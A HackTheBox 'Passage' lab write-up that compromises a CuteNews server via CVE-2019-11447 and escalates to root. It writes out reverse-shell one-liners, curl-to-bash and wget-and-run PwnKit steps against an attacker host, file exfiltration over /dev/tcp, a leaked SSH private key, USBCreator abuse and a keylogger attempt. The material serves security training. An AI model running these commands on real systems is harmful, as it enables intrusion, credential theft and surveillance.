---
render_with_liquid: false
title: HackTheBox Writeup  Passage
date: 2024-02-08 11:38:50 +1400
tags: [hackthebox, nmap, linux, cutenews, cariddi, cve-2019-11447, php, file-upload, information-disclosure, hashcat, password-spraying, enum, misconfiguration, linpeas, usb-creator, oscp-like, pwnkit, xspy]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage]
└─$ pt init '10.129.19.253 passage.htb'
+---------+--------+---------------+-------------+
| PROFILE | STATUS |      IP       |   DOMAIN    |
+---------+--------+---------------+-------------+
| passage | on     | 10.129.19.253 | passage.htb |
+---------+--------+---------------+-------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Thu Feb  8 11:38:50 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, passage.htb
Nmap scan report for passage.htb (10.129.19.253)
Host is up, received user-set (0.087s latency).
Scanned at 2024-02-08 11:38:50 CST for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=
|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Feb  8 11:39:00 2024 -- 1 IP address (1 host up) scanned in 9.87 seconds
```

## 80 - HTTP : CuteNews


### Info

- Domain : `passage.htb`
- Usernames : `nadav`, `paul`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage]
└─$ echo '10.129.19.253' | cariddi -rua -info
                 _     _     _ _
                (_)   | |   | (_)
   ___ __ _ _ __ _  __| | __| |_
  / __/ _` | '__| |/ _` |/ _` | |
 | (_| (_| | |  | | (_| | (_| | |
  \___\__,_|_|  |_|\__,_|\__,_|_| v1.3.2

 > github.com/edoardottt/cariddi
 > edoardoottavianelli.it
========================================
http://10.129.19.253
http://10.129.19.253/CuteNews/rss.php
http://10.129.19.253/index.php?id=11
http://10.129.19.253/CuteNews/skins/images/rss_icon.gif
http://10.129.19.253/index.php?id=6
http://10.129.19.253/index.php
http://10.129.19.253/index.php?id=3
http://10.129.19.253/index.php?id=8
http://10.129.19.253/index.php?do=archives
http://10.129.19.253/index.php?do=rss
http://10.129.19.253/CuteNews/libs/js/bootstrap.min.js
http://10.129.19.253/index.php?do=rss&id=11
http://10.129.19.253/index.php?do=rss&id=6
http://10.129.19.253/CuteNews/libs/css/cosmo.min.css
http://10.129.19.253/CuteNews/libs/js/jquery.js
http://10.129.19.253/index.php?do=rss&id=5
http://10.129.19.253/index.php?do=rss&id=4
http://10.129.19.253/index.php?do=rss&id=8
http://10.129.19.253/index.php?id=7
http://10.129.19.253/CuteNews/libs/css/font-awesome.min.css
http://10.129.19.253/index.php?id=2
http://10.129.19.253/index.php?id=1
http://10.129.19.253/index.php?id=4
http://10.129.19.253/index.php?id=5
http://10.129.19.253/index.php?do=rss&id=7
http://10.129.19.253/index.php?do=rss&id=3
http://10.129.19.253/index.php?do=rss&id=2
http://10.129.19.253/index.php?do=rss&id=1
[ Email address ] nadav@passage.htb in http://10.129.19.253
[ Email address ] kim@example.com in http://10.129.19.253
[ Email address ] sid@example.com in http://10.129.19.253
[ Email address ] paul@passage.htb in http://10.129.19.253
[ HTML comment ] <!-- **CSS - stylesheets** --> in http://10.129.19.253
[ HTML comment ] <!-- **JS Javascripts** --> in http://10.129.19.253
[ HTML comment ] <!-- MAIN CONTENT, FIRST --> in http://10.129.19.253
[ HTML comment ] <!--blog-item--> in http://10.129.19.253
[ HTML comment ] <!-- News Powered by CuteNews: http://cutephp.com/ --> in http://10.129.19.253
[ Email address ] james@example.com in http://10.129.19.253/index.php?id=3
[ HTML comment ] <!--/.media--> in http://10.129.19.253/index.php?id=3
```

```ruby
http://passage.htb [200] [Passage News] [Apache/2.4.18 (Ubuntu)] [Apache HTTP Server:2.4.18,Ubuntu] [fff9ced3260c429ea0491071e7c7696c1e223113]
```

![](/assets/obsidian/2e7a7c44981d59aaf727dac72dd6ddc2.png)

# User Flag
---

## Shell as www-data


### CuteNews 2.1.2 RCE


#### Foothold

I have no knowledge about the CMS : `Cutenews`'s version, but I know it was around `2020` based on the `Passage News 2020` footer

There's an exploit : `CuteNews 2.1.2 - Remote Code Execution ` released around the date

> https://www.exploit-db.com/exploits/48800

![](/assets/obsidian/88fdbbec96bc197886e5dd2743c2755d.png)

![](/assets/obsidian/d5801e4aab98306e4c17c06517edd64d.png)

The exploit will dump credentials through `{ip}/CuteNews/cdata/users/lines`

Then register an user in order to upload a php webshell with magic bytes as an avatar

![](/assets/obsidian/21fae296e45fc144d12368eb72dfa6b6.png)

#### Validate exploit

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ searchsploit -m 48800
  Exploit: CuteNews 2.1.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48800
     Path: /usr/share/exploitdb/exploits/php/webapps/48800.py
    Codes: CVE-2019-11447
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/Passage/exploit/48800.py


┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ python 48800.py



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://passage.htb/
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: ZAWuTDYMZa and password: ZAWuTDYMZa

=======================================================
Sending Payload
=======================================================
signature_key: b198605c0dff17902cd403af12b3aeab-ZAWuTDYMZa
signature_dsi: 5fa6c58bd73193eedcc3e96dd6ca0065
logged in user: ZAWuTDYMZa
============================
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Crack user hahses

At the mean time, I will try to crack the hashes to hopefully get some passwords to spray

```bash
hashcat loot/80_users.hash /opt/wordlists/rockyou.txt -m 1400
```

There's one password found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage]
└─$ hashcat loot/80_users.hash /opt/wordlists/rockyou.txt -m 1400 --show
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
```

#### Get a shell

Host reverse shell script

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage]
└─$ mkdir -p www && cd www && echo "/bin/bash -c 'bash -i >& /dev/tcp/$(pt get lhost)/1111 0>&1'" > index.html && fuser -k 80/tcp 2>/dev/null; python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
command > curl 10.10.14.9 | bash
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.19.253] 42346
bash: cannot set terminal process group (1703): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<tml/CuteNews/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 50 columns 209
www-data@passage:/var/www/html/CuteNews/uploads$
```

## From www-data to paul


### Password spray

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
```

I will try the password `atlanta1` on all users

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ cat /etc/passwd|grep sh$|awk -F':' '{print$1}'
root
nadav
paul
```

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ su - root
Password:
su: Authentication failure
www-data@passage:/var/www/html/CuteNews/uploads$ su - nadav
Password:
su: Authentication failure
www-data@passage:/var/www/html/CuteNews/uploads$ su - paul
Password:
paul@passage:~$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
paul@passage:~$ cat user.txt
5c107d52957921189b2e060da53e7e96
```

# Root Flag
---

## From paul to nadav


### Enumeration

There's `.Xauthority presented`, and `nadav` have a logon session, so if I get access to `nadav`, I may be able to abuse `Xauthority` cookie to view the user desktop

```bash
paul@passage:~$ strings .Xauthority
passage
MIT-MAGIC-COOKIE-1
paul@passage:~$ w
 20:38:26 up  1:16,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
nadav    tty7     :0               19:22    1:15m  3.83s  0.18s /sbin/upstart --user
```

### Misconfigured ssh key

I noticed a weird thing about the ssh keys

```bash
paul@passage:~$ find . -type f -exec ls -latr {} + 2>/dev/null
-rw-r--r-- 1 paul paul    220 Aug 31  2015 ./.bash_logout
-rw-r--r-- 1 paul paul   8980 Apr 20  2016 ./examples.desktop
-rw-r--r-- 1 paul paul    655 May 16  2017 ./.profile
-rw-r--r-- 1 paul paul    395 Jul 21  2020 ./.ssh/id_rsa.pub
-rw------- 1 paul paul   1679 Jul 21  2020 ./.ssh/id_rsa
-rw-r--r-- 1 paul paul    395 Jul 21  2020 ./.ssh/authorized_keys
---------- 1 paul paul      0 Jul 21  2020 ./.bash_history
-rw-r--r-- 1 paul paul   3770 Jul 21  2020 ./.bashrc
[...]
-r-------- 1 paul paul     33 Feb  7 19:22 ./user.txt
```

`paul` allows nadav to login with its private key

```bash
paul@passage:~$ cat ./.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

The ssh public key for paul was belong to `nadav`

```bash
paul@passage:~$ cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

Could the private key belong to `nadav` too?

```bash
paul@passage:~$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----
```

It is ...

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ vi nadav.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ chmod 600 nadav.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Passage/exploit]
└─$ ssh -i nadav.id_rsa nadav@passage.htb
The authenticity of host 'passage.htb (10.129.19.253)' can't be established.
ED25519 key fingerprint is SHA256:BD7E5sbGZ+avx6QQcDrb9FWVVlbulHrgseaqsAQrvC4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'passage.htb' (ED25519) to the list of known hosts.
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

## From nadav to root


### USBCreator

Ran **linpeas**

![](/assets/obsidian/e2304c9367e95c0c7c718ebd172ea8b0.png)

Google : `https://gist.github.com/noobpk/a4f0a029488f37939c4df6e20472501d`

> https://gist.github.com/noobpk/a4f0a029488f37939c4df6e20472501d

Copy my `id_rsa.pub` key to `/root/.ssh/authorized_keys/`

```bash
nadav@passage:~$ echo "ssh-rsa AAAAB3NzaC1yc...XDWPH1etLL9IE= kali@kali" > /tmp/key
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/key /root/.ssh/authorized_keys true
()
```

SSH as root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage]
└─$ ssh -i id_rsa root@$(pt get rhost)
Warning: Identity file id_rsa not accessible: No such file or directory.
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# cat /root/root.txt
d571d6d3973af1587efc6f40fa8af6aa
```

# Additional
---

## Pwnkit

Some HTB old machine have patched it, but some just don't

```bash
www-data@passage:/var/www/html/CuteNews/uploads$ cd /tmp && wget 10.10.14.9/PwnKit -O pk && chmod +x pk && ./pk
--2024-02-07 20:54:16--  http://10.10.14.9/PwnKit
Connecting to 10.10.14.9:80... rm pk
connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'pk'

pk                                                   100%[===================================================================================================================>]  17.62K  --.-KB/s    in 0.09s

2024-02-07 20:54:16 (200 KB/s) - 'pk' saved [18040/18040]

root@passage:/tmp# rm pk
root@passage:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```


## Failed attempts


### Xauthority


#### Screenshot

> https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11

```bash
nadav@passage:~$ strings .Xauthority
ubuntu
MIT-MAGIC-COOKIE-1
 =9o
passage
MIT-MAGIC-COOKIE-1

nadav@passage:~$ w
 20:41:39 up  1:19,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
nadav    tty7     :0               19:22    1:19m  3.94s  0.18s /sbin/upstart --user
nadav    pts/18   10.10.14.9       20:32    0.00s  0.13s  0.00s w
```

To use the cookie, I need to set the environment variable

```bash
nadav@passage:~$ export XAUTHORITY=.Xauthority
```

Take a screenshot

```bash
nadav@passage:~$ xwd -root -screen -silent -display :0 > screenshot.xwd
```

Transfer the file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage]
└─$ nc -lvnp 443 > loot/screenshot.xwd
```

```bash
nadav@passage:~$ cat screenshot.xwd > /dev/tcp/10.10.14.9/443
```

Unfortunately, the screenshot was a black screen

```bash
┌──(bravosec㉿fsociety)-[~/htb/Passage/loot]
└─$ convert screenshot.xwd screenshot.png

┌──(bravosec㉿fsociety)-[~/htb/Passage/loot]
└─$ xdg-open screenshot.png
```

![](/assets/obsidian/a8e3d7492ce8bdcdb8349efe8ae6d0e3.png)

#### Xspy - Keylogging

Need to setup a Ubuntu 16.04 container to compile **xspy** with proper `LIBC` version

```bash
nadav@passage:/tmp$ wget http://10.10.14.9:81/xspy -O /tmp/xspy && chmod +x /tmp/xspy && /tmp/xspy
--2024-02-07 22:22:31--  http://10.10.14.9:81/xspy
Connecting to 10.10.14.9:81... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14416 (14K) [application/octet-stream]
Saving to: ‘/tmp/xspy’

/tmp/xspy                                            100%[===================================================================================================================>]  14.08K  --.-KB/s    in 0.09s

2024-02-07 22:22:31 (160 KB/s) - ‘/tmp/xspy’ saved [14416/14416]

/tmp/xspy: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/xspy)
```

```bash
nadav@passage:/tmp$ cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

Setup docker container

```bash
sudo docker pull ubuntu:16.04
sudo docker run -v /tmp:/tmp -it ubuntu:16.04 bash
```

```bash
apt update && apt install make golang-go ca-certificates git curl zip wget -y
apt-get install -y libx11-dev
```

Build **xspy**

```bash
cd /tmp
wget https://raw.githubusercontent.com/mnp/xspy/master/xspy.c
gcc xspy.c -o xspy -lX11
```

Transfer file

```bash
┌──(bravosec㉿fsociety)-[/tmp]
└─$ serv serve --http 81 -f xspy
```

```bash
nadav@passage:/tmp$ wget http://10.10.14.9:81/xspy -O /tmp/xspy && chmod +x /tmp/xspy
```

Nothing happened

```bash
nadav@passage:/tmp$ /tmp/xspy -display :0
Wed Feb  7 22:25:38 2024
```